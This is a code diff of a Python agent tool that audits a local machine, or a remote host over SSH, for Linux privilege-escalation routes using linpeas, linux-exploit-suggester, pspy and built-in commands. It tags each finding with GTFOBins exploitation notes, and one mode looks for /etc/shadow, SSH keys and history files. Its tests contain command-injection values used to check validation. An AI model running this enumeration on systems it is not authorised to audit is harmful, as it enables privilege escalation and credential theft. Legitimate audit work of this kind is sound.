-                exploit_note=note,
+                path=m.group(1), capabilities=m.group(2), exploit_note=note,
             ))
 
-    # ── Docker / container ──
-    if re.search(r"docker", clean, re.IGNORECASE):
-        docker_matches = re.findall(r"(docker[^\n]+)", clean, re.IGNORECASE)
-        for dm in docker_matches[:10]:
+    # ── Docker/container ─────────────────────────────────────
+    if re.search(r"\bdocker\b", clean, re.IGNORECASE):
+        for dm in re.findall(r"(docker[^\n]+)", clean, re.IGNORECASE)[:10]:
             dm = dm.strip()
             if dm:
                 result.container_findings.append(ContainerResult(
@@ -438,48 +555,32 @@ def parse_linpeas(stdout: str) -> PrivescAuditResult:
     return result
 
 
-def parse_les(stdout: str) -> list[KernelExploitResult]:
-    """
-    Parse linux-exploit-suggester output.
-
-    LES outputs sections like:
-      [+] [CVE-2021-4034] PwnKit
-          Details: https://...
-          Tags: ...
-    """
+def _parse_les(stdout: str, command: str) -> PrivescAuditResult:
+    clean    = _strip_ansi(stdout)
     exploits: list[KernelExploitResult] = []
-    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
-    clean = ansi_escape.sub("", stdout)
 
-    # Match CVE blocks
-    cve_pattern = re.compile(
+    _HIGH_KW = frozenset({
+        "root", "privesc", "priv esc", "privilege", "lpe",
+        "pwnkit", "dirty", "rds", "overlayfs", "namespace",
+    })
+
+    cve_pat = re.compile(
         r"\[\+\]\s+\[?(CVE-[\d\-]+)\]?\s+(.+?)\n"
         r"(?:.*?Details:\s*(https?://\S+))?"
         r"(?:.*?Tags:\s*(.+?))?(?=\[\+\]|\Z)",
-        re.DOTALL
+        re.DOTALL,
     )
-    for m in cve_pattern.finditer(clean):
+    for m in cve_pat.finditer(clean):
         cve   = m.group(1).strip()
         name  = m.group(2).strip()
         url   = m.group(3).strip() if m.group(3) else None
         tags  = m.group(4).strip() if m.group(4) else None
-
-        # Rough severity from name keywords
-        severity = "medium"
-        high_keywords = ["root", "privesc", "priv esc", "privilege", "lpe", "pwnkit",
-                         "dirty", "rds", "overlayfs", "namespace"]
-        if any(kw in name.lower() or (tags and kw in tags.lower()) for kw in high_keywords):
-            severity = "high"
-
+        combo = (name + " " + (tags or "")).lower()
+        severity = "high" if any(kw in combo for kw in _HIGH_KW) else "medium"
         exploits.append(KernelExploitResult(
-            cve=cve,
-            name=name,
-            severity=severity,
-            url=url,
-            notes=tags,
+            cve=cve, name=name, severity=severity, url=url, notes=tags,
         ))
 
-    # Also parse plain "Possible Exploits" section
     if not exploits:
         for m in re.finditer(r"\[\+\]\s+(.+?)(?:\n|$)", clean):
             entry = m.group(1).strip()
@@ -491,110 +592,96 @@ def parse_les(stdout: str) -> list[KernelExploitResult]:
                     severity="medium",
                 ))
 
-    return exploits
+    return PrivescAuditResult(
+        success=bool(exploits),
+        tool="linux-exploit-suggester",
+        mode="",
+        command=command,
+        kernel_exploits=exploits,
+    )
 
 
-def parse_pspy(stdout: str) -> list[ProcessResult]:
-    """
-    Parse pspy output.
+def _parse_pspy(stdout: str, command: str) -> PrivescAuditResult:
+    clean    = _strip_ansi(stdout)
+    procs: list[ProcessResult] = []
 
-    pspy line format:
-      2024/01/01 12:00:01 CMD: UID=0    PID=1234   | /usr/sbin/cron -f
-    """
-    processes: list[ProcessResult] = []
-    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
-    clean = ansi_escape.sub("", stdout)
-
-    pspy_pattern = re.compile(
+    pat = re.compile(
         r"(\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2})\s+"
         r"CMD:\s+UID=(\d+)\s+PID=(\d+)\s+\|\s+(.+)"
     )
-    for m in pspy_pattern.finditer(clean):
-        timestamp = m.group(1)
-        uid       = m.group(2)
-        pid       = m.group(3)
-        cmd       = m.group(4).strip()
-
-        # Detect trigger source
+    for m in pat.finditer(clean):
+        cmd_str      = m.group(4).strip()
+        uid          = m.group(2)
         triggered_by = None
-        if "cron" in cmd.lower():
+        if "cron" in cmd_str.lower():
             triggered_by = "cron"
         elif uid == "0":
             triggered_by = "root-daemon"
-
-        processes.append(ProcessResult(
-            uid=uid,
-            pid=pid,
-            command=cmd,
-            timestamp=timestamp,
+        procs.append(ProcessResult(
+            uid=uid, pid=m.group(3),
+            command=cmd_str,
+            timestamp=m.group(1),
             triggered_by=triggered_by,
         ))
 
-    return processes
+    return PrivescAuditResult(
+        success=bool(procs),
+        tool="pspy", mode="", command=command,
+        processes=procs,
+    )
 
 
-def parse_manual(stdout: str, stderr: str, mode: str) -> PrivescAuditResult:
-    """
-    Parse output from manual built-in commands:
-    find / -perm -4000, getcap -r /, sudo -l, etc.
-    """
+def _parse_manual(stdout: str, stderr: str, mode: str, command: str) -> PrivescAuditResult:
     raw = stdout or stderr
+    # stdout may have results even when rc!=0 (find reports /proc errors — normal)
     result = PrivescAuditResult(
-        success=bool(raw.strip()),
-        tool="manual",
-        mode=mode,
-        command="",
+        success=bool(stdout.strip()),
+        tool="manual", mode=mode, command=command,
     )
 
     if mode == "manual_suid":
-        for line in raw.strip().split("\n"):
+        seen: set[str] = set()
+        for line in raw.strip().splitlines():
             line = line.strip()
-            if line.startswith("/"):
-                perm_match = re.match(r"(-\S+)\s+\d+\s+(\S+)\s+(\S+).*?(/\S+)", line)
-                if perm_match:
-                    path = perm_match.group(4)
-                    gtf, note = check_gtfobins(path)
-                    result.suid_bins.append(SUIDResult(
-                        path=path,
-                        permissions=perm_match.group(1),
-                        owner=perm_match.group(2),
-                        group=perm_match.group(3),
-                        gtfobins=gtf,
-                        exploit_note=note,
-                    ))
-                else:
-                    # plain path output
-                    gtf, note = check_gtfobins(line)
-                    result.suid_bins.append(SUIDResult(
-                        path=line,
-                        gtfobins=gtf,
-                        exploit_note=note,
-                    ))
-
-    elif mode == "manual_caps":
-        # getcap output: /usr/bin/python3.8 = cap_setuid+eip
-        for m in re.finditer(r"(/\S+)\s+=\s+(\S+)", raw):
-            note = check_caps(m.group(2))
-            result.capabilities.append(CapabilityResult(
-                path=m.group(1),
-                capabilities=m.group(2),
+            if not line:
+                continue
+            # ls -l style: permissions links owner group size date path
+            pm = re.match(r"(?:\s*\d+\s+\d+\s+)?(-\S+)\s+\d+\s+(\S+)\s+(\S+).*?(/\S+)\s*$", line)
+            if pm:
+                path = pm.group(4)
+            elif line.startswith("/"):
+                path = line.split()[0]
+            else:
+                continue
+            if path in seen:
+                continue
+            seen.add(path)
+            gtf, note = _check_gtfobins(path)
+            result.suid_bins.append(SUIDResult(
+                path=path,
+                permissions=pm.group(1) if pm else None,
+                owner=pm.group(2) if pm else None,
+                group=pm.group(3) if pm else None,
+                gtfobins=gtf,
                 exploit_note=note,
             ))
 
+    elif mode == "manual_caps":
+        # getcap: /usr/bin/python3.8 = cap_setuid+eip
+        for m in re.finditer(r"(/\S+)\s+=\s+(\S+)", raw):
+            note = _check_caps(m.group(2))
+            result.capabilities.append(CapabilityResult(
+                path=m.group(1), capabilities=m.group(2), exploit_note=note,
+            ))
+
     elif mode == "manual_sudo":
-        # sudo -l output
-        for m in re.finditer(
-            r"\((\S+)\)\s*(NOPASSWD:\s*)?(/\S+|\bALL\b)", raw
-        ):
-            cmd = m.group(3).strip()
+        for m in re.finditer(r"\((\S+)\)\s*(NOPASSWD:\s*)?(/\S+|\bALL\b)", raw):
+            cmd_str  = m.group(3).strip()
             nopasswd = bool(m.group(2))
-            gtf, note = check_gtfobins(cmd)
+            gtf, note = _check_gtfobins(cmd_str)
             result.sudo_rules.append(SudoResult(
-                runas=m.group(1),
-                command=cmd,
-                nopasswd=nopasswd,
-                gtfobins=gtf,
-                exploit_note=note,
+                runas=m.group(1), command=cmd_str,
+                nopasswd=nopasswd, gtfobins=gtf, exploit_note=note,
             ))
 
     elif mode == "manual_cron":
@@ -608,7 +695,7 @@ def parse_manual(stdout: str, stderr: str, mode: str) -> PrivescAuditResult:
             ))
 
     elif mode == "manual_writable":
-        for line in raw.strip().split("\n"):
+        for line in raw.strip().splitlines():
             line = line.strip()
             if line.startswith("/"):
                 result.writable_paths.append(WritableResult(path=line))
@@ -620,10 +707,9 @@ def parse_manual(stdout: str, stderr: str, mode: str) -> PrivescAuditResult:
         ))
 
     elif mode == "manual_env":
-        for line in raw.strip().split("\n"):
+        for line in raw.strip().splitlines():
             if line.startswith("PATH="):
-                dirs = line[5:].split(":")
-                for d in dirs:
+                for d in line[5:].split(":"):
                     if d in (".", "", "./", ".."):
                         result.writable_paths.append(WritableResult(
                             path=d,
@@ -635,342 +721,225 @@ def parse_manual(stdout: str, stderr: str, mode: str) -> PrivescAuditResult:
 
 
 # ══════════════════════════════════════════════════════════════
-# 4. EXECUTOR
+# 6. COMMAND BUILDERS
 # ══════════════════════════════════════════════════════════════
 
-def safe_execute(cmd: list[str], timeout: int = 300) -> tuple[str, str, int]:
-    """Run command safely — no shell, no injection"""
-    try:
-        result = subprocess.run(
-            cmd,
-            capture_output=True,
-            text=True,
-            timeout=timeout,
-            shell=False,
-        )
-        return result.stdout, result.stderr, result.returncode
-    except subprocess.TimeoutExpired:
-        return "", f"Timed out after {timeout}s", -1
-    except FileNotFoundError:
-        return "", f"Tool '{cmd[0]}' not installed", -1
-    except Exception as e:
-        return "", str(e), -1
+def _build_cmd(req: PrivescAuditRequest) -> tuple[list[str], Optional[str]]:
+    """Return (cmd, error_or_None)."""
+    tool = req.tool
+    mode = req.mode
+    args = list(req.args)
 
+    if tool == "linpeas":
+        if mode == "full_audit":
+            return ["bash", _LINPEAS_BIN] + args, None
+        if mode in _LINPEAS_SECTION:
+            return ["bash", _LINPEAS_BIN, "-o", _LINPEAS_SECTION[mode]] + args, None
+        return ["bash", _LINPEAS_BIN] + args, None
 
-# ── Manual command map ──
-MANUAL_COMMANDS: dict[str, list[str]] = {
-    "manual_suid":    ["find", "/", "-perm", "-4000", "-type", "f", "-ls", "2>/dev/null"],
-    "manual_caps":    ["getcap", "-r", "/"],
-    "manual_writable":["find", "/", "-writable", "-not", "-path", "*/proc/*", "-not", "-path", "*/sys/*"],
-    "manual_cron":    ["cat", "/etc/crontab"],
-    "manual_sudo":    ["sudo", "-l"],
-    "manual_docker":  ["id"],
-    "manual_env":     ["env"],
-}
+    if tool == "linux-exploit-suggester":
+        return ["bash", _LES_BIN] + args, None
 
-# For manual_suid we can't use shell redirect 2>/dev/null without shell=True
-# We handle stderr suppression via capture_output=True in safe_execute
-MANUAL_COMMANDS["manual_suid"] = ["find", "/", "-perm", "-4000", "-type", "f", "-ls"]
+    if tool == "pspy":
+        if mode == "pspy_cron":
+            base = ["-i", "500", "-p"]
+        else:
+            base = ["-p", "-i", "1000"]
+        return [_PSPY_BIN] + (args or base), None
+
+    if tool == "manual":
+        if mode == "manual_cron":
+            # Read multiple cron sources using bash -c is safe here because
+            # all strings are hardcoded literals — no user input in the shell string
+            return [
+                "bash", "-c",
+                "cat /etc/crontab 2>/dev/null; "
+                "cat /etc/cron.d/* 2>/dev/null; "
+                "cat /var/spool/cron/crontabs/* 2>/dev/null",
+            ], None
+        if mode in _MANUAL_CMDS:
+            return _MANUAL_CMDS[mode] + args, None
+        return [], f"No command mapping for manual mode: {mode!r}"
+
+    return [], f"Unknown tool: {tool!r}"
 
 
 # ══════════════════════════════════════════════════════════════
-# 5. MAIN TOOL FUNCTION
+# 7. MAIN TOOL FUNCTION
 # ══════════════════════════════════════════════════════════════
 
 def linux_privesc_audit(
-    tool: str,
-    mode: str,
-    args: list[str] = [],
-) -> dict:
+    tool:     str,
+    mode:     str,
+    target:   Optional[str] = None,
+    username: Optional[str] = None,
+    password: Optional[str] = None,
+    key_path: Optional[str] = None,
+    args:     Optional[list[str]] = None,
+    timeout:  int                 = 300,
+) -> dict[str, Any]:
     """
-    🔧 Agent Tool: Linux Privilege Escalation Audit
-
-    Enumerates the local system for privilege escalation vectors:
-    SUID/SGID binaries, sudo misconfigs, cron job abuse, writable paths,
-    dangerous capabilities, kernel CVEs, docker group escape, process spy.
-
-    Capabilities:
-      ┌────────────────────────────────────────────────────────────────────┐
-      │  SUID / SGID BINS     linpeas, manual find -perm -4000            │
-      │  SUDO MISCONFIG       linpeas, manual sudo -l                     │
-      │  CRON ABUSE           linpeas, pspy, manual crontab               │
-      │  WRITABLE PATHS       linpeas, manual find -writable              │
-      │  CAPABILITIES         linpeas, manual getcap -r /                 │
-      │  KERNEL EXPLOITS      linux-exploit-suggester (LES)               │
-      │  DOCKER / LXC ESCAPE  linpeas, manual id + group check            │
-      │  PROCESS SPY          pspy (no root needed, catches cron/suid)    │
-      │  GTFOBINS LOOKUP      offline — auto-annotates every finding       │
-      └────────────────────────────────────────────────────────────────────┘
+    Linux Privilege Escalation Audit — agent tool.
+    Returns structured dict — never writes to disk.
 
     Args:
-        tool:   "linpeas" | "linux-exploit-suggester" | "pspy" | "manual"
-        mode:   Operation mode (see below)
-        args:   Raw tool arguments — agent decides
-
-    ── linpeas modes ────────────────────────────────────────────────────
-        "full_audit"       → linpeas.sh (all checks)
-                             args: ["-a"]            extended checks
-                                   ["-s"]            super fast (skip heavy checks)
-                                   ["-P", "password"] check with known password
-
-        "suid_sgid"        → linpeas.sh -o SuidBins
-        "sudo_misconfig"   → linpeas.sh -o Sudo
-        "cron_jobs"        → linpeas.sh -o CronJobs
-        "writable_paths"   → linpeas.sh -o WritableFiles
-        "capabilities"     → linpeas.sh -o Capabilities
-        "kernel_exploits"  → linpeas.sh -o KernelExploits
-        "docker_lxc"       → linpeas.sh -o DockerFiles
-        "network_info"     → linpeas.sh -o NetInfo
-        "password_files"   → linpeas.sh -o PasswordsFiles
-
-    ── linux-exploit-suggester modes ────────────────────────────────────
-        "les_kernel"       → linux-exploit-suggester.sh
-                             args: ["--kernelspace-only"]
-                                   ["--kernel", "5.4.0"]   specify kernel manually
-
-        "les_extended"     → linux-exploit-suggester.sh
-                             args: ["--userspace"]          include userspace CVEs
-                                   ["--pkglist-file", "/tmp/pkgs.txt"]
-
-    ── pspy modes ───────────────────────────────────────────────────────
-        "pspy_procs"       → pspy (watch all processes for N seconds)
-                             args: ["-p"]             print commands to stdout
-                                   ["-i", "1000"]     poll interval ms
-                                   ["-f"]             also watch filesystem events
-
-        "pspy_cron"        → pspy (focused: watch for UID=0 cron triggers)
-                             args: ["-i", "500", "-p"]
-
-    ── manual modes (no external tool — pure system commands) ───────────
-        "manual_suid"      → find / -perm -4000 -type f -ls
-        "manual_caps"      → getcap -r /
-        "manual_writable"  → find / -writable (excl. /proc /sys)
-        "manual_cron"      → cat /etc/crontab + /var/spool/cron
-        "manual_sudo"      → sudo -l
-        "manual_docker"    → id (check docker/lxd group membership)
-        "manual_env"       → env (PATH hijack detection)
+        tool    : linpeas | linux-exploit-suggester | pspy | manual
+        mode    : see LINUX_PRIVESC_AUDIT_TOOL_DEFINITION for full list
+        args    : extra CLI flags for the underlying tool
+        timeout : max wall-clock seconds (30–3600)
 
     Returns:
-        Structured JSON: suid_bins → sudo_rules → cron_jobs → writable_paths →
-                         capabilities → kernel_exploits → container_findings →
-                         processes (each auto-annotated with GTFOBins notes)
+        PrivescAuditResult as dict with keys:
+        success, tool, mode, command, hostname, kernel_version, current_user,
+        suid_bins, sudo_rules, cron_jobs, writable_paths, capabilities,
+        kernel_exploits, container_findings, processes, raw_output, error,
+        execution_time
     """
+    start = time.monotonic()
+    args  = args or []
 
-    start = time.time()
+    def _fail(msg: str) -> dict[str, Any]:
+        return PrivescAuditResult(
+            success=False, tool=tool, mode=mode, command="",
+            error=msg,
+            execution_time=round(time.monotonic() - start, 2),
+        ).model_dump()
 
-    # ══════════════════════════════
-    # VALIDATE
-    # ══════════════════════════════
+    # ── Validate ──────────────────────────────────────────────
     try:
-        req = PrivescAuditRequest(tool=tool, mode=mode, args=args)
-    except Exception as e:
-        return PrivescAuditResult(
-            success=False, tool=tool, mode=mode,
-            command="", error=f"Validation: {e}"
-        ).model_dump()
+        req = PrivescAuditRequest(
+            tool=tool, mode=mode, target=target,
+            username=username, password=password, key_path=key_path,
+            args=args, timeout=timeout
+        )
+    except Exception as exc:
+        return _fail(f"Validation: {exc}")
 
-    # ══════════════════════════════
-    # BUILD COMMAND
-    # ══════════════════════════════
-    cmd: list[str] = []
+    # ── Build command ─────────────────────────────────────────
+    cmd, build_err = _build_cmd(req)
+    if build_err:
+        return _fail(build_err)
+    if not cmd:
+        return _fail("No command generated")
 
-    # ── linpeas ──
-    if tool == "linpeas":
-        linpeas_bin = "/tmp/linpeas.sh"
-
-        LINPEAS_SECTION_FLAGS: dict[str, str] = {
-            "suid_sgid":      "SuidBins",
-            "sudo_misconfig": "Sudo",
-            "cron_jobs":      "CronJobs",
-            "writable_paths": "WritableFiles",
-            "capabilities":   "Capabilities",
-            "kernel_exploits":"KernelExploits",
-            "docker_lxc":     "DockerFiles",
-            "network_info":   "NetInfo",
-            "password_files": "PasswordsFiles",
-        }
-
-        if mode == "full_audit":
-            cmd = ["bash", linpeas_bin] + list(req.args)
-        elif mode in LINPEAS_SECTION_FLAGS:
-            section = LINPEAS_SECTION_FLAGS[mode]
-            cmd = ["bash", linpeas_bin, "-o", section] + list(req.args)
-        else:
-            cmd = ["bash", linpeas_bin] + list(req.args)
-
-    # ── linux-exploit-suggester ──
-    elif tool == "linux-exploit-suggester":
-        les_bin = "/tmp/linux-exploit-suggester.sh"
-        cmd = ["bash", les_bin] + list(req.args)
-
-    # ── pspy ──
-    elif tool == "pspy":
-        pspy_bin = "/tmp/pspy64"
-
-        if mode == "pspy_cron":
-            base_args = ["-i", "500", "-p"]
-        else:
-            base_args = ["-p", "-i", "1000"]
-
-        # Agent overrides take priority
-        final_args = list(req.args) if req.args else base_args
-        cmd = [pspy_bin] + final_args
-
-    # ── manual ──
-    elif tool == "manual":
-        if mode in MANUAL_COMMANDS:
-            cmd = MANUAL_COMMANDS[mode] + list(req.args)
-        elif mode == "manual_cron":
-            # Read multiple cron sources — run as a sequence
-            cmd = ["bash", "-c",
-                   "cat /etc/crontab 2>/dev/null; "
-                   "ls /etc/cron.d/ 2>/dev/null; "
-                   "cat /var/spool/cron/crontabs/* 2>/dev/null"]
-        else:
-            return PrivescAuditResult(
-                success=False, tool=tool, mode=mode,
-                command="", error=f"Unknown manual mode: {mode}"
-            ).model_dump()
-    else:
-        return PrivescAuditResult(
-            success=False, tool=tool, mode=mode,
-            command="", error=f"Unknown tool: {tool}"
-        ).model_dump()
-
-    # ══════════════════════════════
-    # EXECUTE
-    # ══════════════════════════════
+    # ── Execute ───────────────────────────────────────────────
     command_str = " ".join(cmd)
-    stdout, stderr, rc = safe_execute(cmd, req.timeout)
+    if req.target:
+        stdout, stderr, rc = _ssh_execute(req, cmd)
+    else:
+        stdout, stderr, rc = _safe_execute(cmd, req.timeout)
 
-    # ══════════════════════════════
-    # PARSE
-    # ══════════════════════════════
-    result: PrivescAuditResult
-
+    # ── Parse ─────────────────────────────────────────────────
     if tool == "linpeas":
-        result = parse_linpeas(stdout or stderr)
-        result.mode    = mode
-        result.command = command_str
+        result = _parse_linpeas(stdout or stderr, mode, command_str)
 
     elif tool == "linux-exploit-suggester":
-        exploits = parse_les(stdout or stderr)
-        result = PrivescAuditResult(
-            success=len(exploits) > 0 or rc == 0,
-            tool=tool, mode=mode, command=command_str,
-            kernel_exploits=exploits,
-        )
+        result = _parse_les(stdout or stderr, command_str)
+        result.mode = mode
 
     elif tool == "pspy":
-        procs = parse_pspy(stdout or stderr)
-        result = PrivescAuditResult(
-            success=len(procs) > 0 or rc == 0,
-            tool=tool, mode=mode, command=command_str,
-            processes=procs,
-        )
+        result = _parse_pspy(stdout or stderr, command_str)
+        result.mode = mode
 
-    elif tool == "manual":
-        result = parse_manual(stdout, stderr, mode)
-        result.tool    = tool
-        result.mode    = mode
-        result.command = command_str
+    else:  # manual
+        result = _parse_manual(stdout, stderr, mode, command_str)
 
-    else:
-        result = PrivescAuditResult(
-            success=False, tool=tool, mode=mode,
-            command=command_str, error=f"Unknown tool: {tool}"
-        )
+    # ── Finalise ──────────────────────────────────────────────
+    result.raw_output     = (stdout or stderr)[:_RAW_LIMIT] or None
+    result.execution_time = round(time.monotonic() - start, 2)
 
-    # ── Attach raw output + timing ──
-    result.raw_output      = (stdout or stderr)[:5000]
-    result.error           = stderr[:1000] if rc != 0 and not result.suid_bins \
-                             and not result.sudo_rules and not result.kernel_exploits \
-                             and not result.capabilities and not result.processes else None
-    result.execution_time  = round(time.time() - start, 2)
-    result.success         = result.success if result.error is None else False
+    # Only surface stderr as error when the run produced nothing useful
+    has_findings = any([
+        result.suid_bins, result.sudo_rules, result.cron_jobs,
+        result.writable_paths, result.capabilities, result.kernel_exploits,
+        result.container_findings, result.processes,
+    ])
+    if rc != 0 and not has_findings and not stdout.strip():
+        result.error   = stderr.strip()[:_ERR_LIMIT] or None
+        result.success = False
 
     return result.model_dump()
 
 
 # ══════════════════════════════════════════════════════════════
-# 6. TOOL DEFINITION (for LLM)
+# 8. TOOL DEFINITION
 # ══════════════════════════════════════════════════════════════
 
-LINUX_PRIVESC_AUDIT_TOOL_DEFINITION = {
+LINUX_PRIVESC_AUDIT_TOOL_DEFINITION: dict[str, Any] = {
     "name": "linux_privesc_audit",
     "description": (
-        "Audit a Linux system for privilege escalation vectors: "
-        "SUID/SGID binaries, sudo misconfigs, cron job abuse, writable paths, "
-        "dangerous capabilities, kernel CVEs, docker/lxc group escapes, and process spying. "
-        "Every finding is auto-annotated with GTFOBins exploitation notes. "
-        "Supports linpeas (full enum), linux-exploit-suggester (kernel CVEs), "
-        "pspy (passive process spy), and manual built-in commands. "
-        "YOU decide the mode and args."
+        "Audit the local Linux system for privilege escalation vectors. "
+        "Finds SUID/SGID binaries, sudo misconfigs, cron job abuse, writable paths, "
+        "dangerous capabilities, kernel CVEs, docker group escapes, and running processes. "
+        "Every finding is auto-annotated with GTFOBins exploitation notes (offline). "
+        "Supports linpeas, linux-exploit-suggester, pspy, and manual built-in commands."
     ),
     "parameters": {
         "type": "object",
         "properties": {
+            "target": {
+                "type": "string",
+                "description": "Optional: Target IP / Hostname for SSH execution. If omitted, runs natively on the local node.",
+            },
+            "username": {"type": "string", "description": "SSH username"},
+            "password": {"type": "string", "description": "SSH password"},
+            "key_path": {"type": "string", "description": "SSH private key path on disk"},
             "tool": {
                 "type": "string",
-                "enum": ["linpeas", "linux-exploit-suggester", "pspy", "manual"],
+                "enum": sorted(_ALLOWED_TOOLS),
                 "description": (
-                    "linpeas                 = full local privilege escalation enumeration |\n"
-                    "linux-exploit-suggester = kernel CVE matching (LES) |\n"
-                    "pspy                    = passive process spy, no root needed |\n"
-                    "manual                  = built-in system commands, no external tool"
+                    "linpeas                  = comprehensive local enum |\n"
+                    "linux-exploit-suggester  = kernel CVE matching |\n"
+                    "pspy                     = passive process spy (no root needed) |\n"
+                    "manual                   = built-in system commands, no external tool"
                 ),
             },
             "mode": {
                 "type": "string",
-                "enum": [
-                    "full_audit",
-                    "suid_sgid", "sudo_misconfig", "cron_jobs",
-                    "writable_paths", "capabilities", "kernel_exploits",
-                    "docker_lxc", "network_info", "password_files",
-                    "les_kernel", "les_extended",
-                    "pspy_procs", "pspy_cron",
-                    "manual_suid", "manual_caps", "manual_writable",
-                    "manual_cron", "manual_sudo", "manual_docker", "manual_env",
-                ],
+                "enum": sorted(_ALLOWED_MODES),
                 "description": (
-                    "full_audit       → full linpeas run (all vectors)\n"
-                    "suid_sgid        → SUID/SGID binary enum (linpeas)\n"
-                    "sudo_misconfig   → sudo -l + sudoers misconfigs (linpeas)\n"
-                    "cron_jobs        → cron jobs + writable cron scripts (linpeas)\n"
-                    "writable_paths   → world-writable files/dirs (linpeas)\n"
-                    "capabilities     → dangerous linux capabilities (linpeas)\n"
-                    "kernel_exploits  → kernel version → CVE suggestions (linpeas)\n"
-                    "docker_lxc       → docker/lxc group + container escape (linpeas)\n"
-                    "network_info     → network interfaces, ports, hosts (linpeas)\n"
-                    "password_files   → /etc/shadow, .ssh keys, history files (linpeas)\n"
+                    "full_audit       → all linpeas checks\n"
+                    "suid_sgid        → SUID/SGID binaries\n"
+                    "sudo_misconfig   → sudo -l + sudoers\n"
+                    "cron_jobs        → cron + writable cron scripts\n"
+                    "writable_paths   → world-writable files/dirs\n"
+                    "capabilities     → dangerous linux capabilities\n"
+                    "kernel_exploits  → kernel CVE suggestions\n"
+                    "docker_lxc       → docker/lxc group escape\n"
+                    "network_info     → interfaces, ports, hosts\n"
+                    "password_files   → /etc/shadow, .ssh, history\n"
                     "les_kernel       → kernel CVE matching (LES)\n"
                     "les_extended     → kernel + userspace CVEs (LES)\n"
-                    "pspy_procs       → passive process spy — catch cron/root procs\n"
-                    "pspy_cron        → spy for UID=0 cron-triggered commands\n"
-                    "manual_suid      → find / -perm -4000 (no external tool)\n"
-                    "manual_caps      → getcap -r / (no external tool)\n"
-                    "manual_writable  → find / -writable (no external tool)\n"
-                    "manual_cron      → read all crontabs (no external tool)\n"
-                    "manual_sudo      → sudo -l (no external tool)\n"
-                    "manual_docker    → id → check docker/lxd group (no external tool)\n"
-                    "manual_env       → env → PATH hijack detection (no external tool)"
+                    "pspy_procs       → watch all processes\n"
+                    "pspy_cron        → watch for UID=0 cron triggers\n"
+                    "manual_suid      → find / -perm -4000\n"
+                    "manual_caps      → getcap -r /\n"
+                    "manual_writable  → find / -writable\n"
+                    "manual_cron      → read all crontabs\n"
+                    "manual_sudo      → sudo -l\n"
+                    "manual_docker    → id (docker/lxd group check)\n"
+                    "manual_env       → env (PATH hijack detection)"
                 ),
             },
             "args": {
                 "type": "array",
                 "items": {"type": "string"},
                 "description": (
-                    "Raw tool arguments. Examples:\n"
-                    "linpeas full:     ['-a']                     extended checks\n"
-                    "linpeas fast:     ['-s']                     skip heavy checks\n"
-                    "linpeas password: ['-P', 'Password123']      test known password\n"
-                    "LES manual kern:  ['--kernel', '5.4.0-89']   override kernel ver\n"
-                    "LES userspace:    ['--userspace']\n"
-                    "pspy interval:    ['-i', '500', '-p']        500ms poll\n"
-                    "pspy filesystem:  ['-f', '-p']               fs events + procs\n"
-                    "manual_suid:      []                         no extra args needed\n"
-                    "manual_caps:      []                         no extra args needed"
+                    "Extra flags. Examples:\n"
+                    "linpeas full:    ['-a']               extended checks\n"
+                    "linpeas fast:    ['-s']               skip heavy checks\n"
+                    "linpeas passwd:  ['-P', 'Password1']  test known password\n"
+                    "LES kern:        ['--kernel', '5.4.0']\n"
+                    "LES userspace:   ['--userspace']\n"
+                    "pspy fast:       ['-i', '500', '-p']"
                 ),
+            },
+            "timeout": {
+                "type": "integer",
+                "default": 300,
+                "minimum": 30,
+                "maximum": 3600,
+                "description": "Max execution time in seconds.",
             },
         },
         "required": ["tool", "mode"],
@@ -979,144 +948,193 @@ LINUX_PRIVESC_AUDIT_TOOL_DEFINITION = {
 
 
 # ══════════════════════════════════════════════════════════════
-# 7. USAGE EXAMPLES — WHAT AGENT CALLS
+# 9. HELPERS
 # ══════════════════════════════════════════════════════════════
 
+def _sep(char: str = "─", width: int = 64) -> str:
+    return char * width
+
+
+def _print_result(label: str, r: dict) -> None:
+    print(f"\n{_sep()}\n  {label}\n{_sep()}")
+    print(f"  success        : {r['success']}")
+    print(f"  tool           : {r['tool']}")
+    print(f"  mode           : {r['mode']}")
+    print(f"  execution_time : {r['execution_time']}s")
+    print(f"  command        : {r['command']}")
+    if r.get("kernel_version"):
+        print(f"  kernel         : {r['kernel_version']}")
+    if r.get("current_user"):
+        print(f"  user           : {r['current_user']}")
+    if r.get("error"):
+        print(f"  error          : {r['error'][:200]}")
+    if r["suid_bins"]:
+        print(f"  suid_bins ({len(r['suid_bins'])}):")
+        for s in r["suid_bins"][:5]:
+            gtf = " ← GTFOBins!" if s.get("gtfobins") else ""
+            print(f"    {s['path']}{gtf}")
+            if s.get("exploit_note"):
+                print(f"      note: {s['exploit_note'][:80]}")
+    if r["sudo_rules"]:
+        print(f"  sudo_rules ({len(r['sudo_rules'])}):")
+        for s in r["sudo_rules"][:5]:
+            np = " [NOPASSWD]" if s.get("nopasswd") else ""
+            print(f"    ({s.get('runas','?')}) {s['command']}{np}")
+    if r["capabilities"]:
+        print(f"  capabilities ({len(r['capabilities'])}):")
+        for c in r["capabilities"][:5]:
+            print(f"    {c['path']} = {c['capabilities']}")
+            if c.get("exploit_note"):
+                print(f"      note: {c['exploit_note'][:80]}")
+    if r["cron_jobs"]:
+        print(f"  cron_jobs ({len(r['cron_jobs'])}):")
+        for c in r["cron_jobs"][:5]:
+            print(f"    [{c.get('schedule','?')}] {c['command']}")
+    if r["kernel_exploits"]:
+        print(f"  kernel_exploits ({len(r['kernel_exploits'])}):")
+        for k in r["kernel_exploits"][:5]:
+            print(f"    [{k.get('severity','?').upper()}] {k.get('cve','?')} — {k.get('name','?')[:60]}")
+    if r["processes"]:
+        print(f"  processes (first 5 of {len(r['processes'])}):")
+        for p in r["processes"][:5]:
+            print(f"    uid={p.get('uid','?')} {p['command'][:80]}")
+    if r["container_findings"]:
+        print(f"  container_findings ({len(r['container_findings'])}):")
+        for c in r["container_findings"][:3]:
+            print(f"    {c['finding'][:80]}")
+    print(_sep())
+
+
+# ══════════════════════════════════════════════════════════════
+# 10. MAIN — validation + live tests on this machine
+# ══════════════════════════════════════════════════════════════
+
+def _run_validation_tests() -> bool:
+    cases: list[tuple[str, dict]] = [
+        ("PASS — invalid tool",         dict(tool="metasploit", mode="manual_suid")),
+        ("PASS — invalid mode",         dict(tool="manual",     mode="pwn_everything")),
+        ("PASS — injection in arg ;",   dict(tool="manual",     mode="manual_suid", args=["bad;arg"])),
+        ("PASS — injection in arg |",   dict(tool="manual",     mode="manual_suid", args=["bad|arg"])),
